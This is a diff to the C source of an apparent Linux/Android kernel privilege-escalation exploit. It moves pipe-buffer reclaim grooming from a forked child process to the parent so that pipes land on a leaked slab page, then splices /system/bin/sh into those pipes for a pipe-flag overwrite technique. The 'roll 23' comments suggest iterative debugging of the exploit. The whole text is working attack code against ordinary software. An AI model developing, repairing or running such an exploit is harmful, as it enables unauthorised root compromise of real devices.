@@ -1896,18 +1896,9 @@ static uintptr_t jc2_pipe_page_leak_child(void) {
   }
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
   pr_info("pipe page leak: %016zx (raw %016zx)\n", base, leaked);
-  /* drain pipes to consume partial slabs, then reclaim pipes on target */
-  for (int i = 0; i < 64; i++) {
-    if (pipe(pr_reclaim_fds[i % 16]) == 0)
-      fcntl(pr_reclaim_fds[i % 16][0], F_SETPIPE_SZ,
-            PIPE_BUFFER_SLOTS * 4096);
-  }
-  pin_to_core(g_core_sel);
-  SYSCHK(close(skb_sv[0])); SYSCHK(close(skb_sv[1]));
-  for (int i = 0; i < 16; i++) {
-    if (pipe(pr_reclaim_fds[i]) == 0)
-      fcntl(pr_reclaim_fds[i][0], F_SETPIPE_SZ, PIPE_BUFFER_SLOTS * 4096);
-  }
+  /* Fork fix (roll 23): pipe creation moved to the PARENT — after fork,
+   * the child's pr_reclaim_fds are its own copy. The parent creates
+   * pipes on this page after the leak returns (slab is still hot). */
   free(buf);
   return base;
 }
@@ -3597,14 +3588,36 @@ int run_exploit(int argc, char **argv) {
       pr_info("PIPE_FLAG auto-leaked page: %016zx\n", pipebuf_page_base);
     }
     if (pipebuf_page_base) {
+      /*
+       * FORK FIX (roll 23): the leak CHILD created pipes — after fork(),
+       * the parent's pr_reclaim_fds are zeros. Create pipes HERE in the
+       * parent: the child's reclaim choreography just freed the slab
+       * entries, so our pipe() + F_SETPIPE_SZ land on the same page.
+       */
+      for (int i = 0; i < 16; i++) {
+        pr_reclaim_fds[i][0] = -1;
+        pr_reclaim_fds[i][1] = -1;
+      }
+      int created = 0;
+      for (int i = 0; i < 16; i++) {
+        if (pipe(pr_reclaim_fds[i]) == 0) {
+          fcntl(pr_reclaim_fds[i][0], F_SETPIPE_SZ,
+                PIPE_BUFFER_SLOTS * 4096);
+          created++;
+        }
+      }
+      pr_info("PIPE_FLAG: %d parent pipes created\n", created);
       int ofd = open("/system/bin/sh", O_RDONLY);
       if (ofd >= 0) {
+        int spliced = 0;
         for (int i = 0; i < 16; i++) {
           off64_t off = 0;
-          splice(ofd, &off, pr_reclaim_fds[i][1], NULL, 1, 0);
+          if (pr_reclaim_fds[i][1] >= 0 &&
+              splice(ofd, &off, pr_reclaim_fds[i][1], NULL, 1, 0) == 1)
+            spliced++;
         }
         close(ofd);
-        pr_info("PIPE_FLAG: spliced /system/bin/sh into 16 pipes\n");
+        pr_info("PIPE_FLAG: spliced sh into %d pipes (fork fix)\n", spliced);
       }
     }
   }
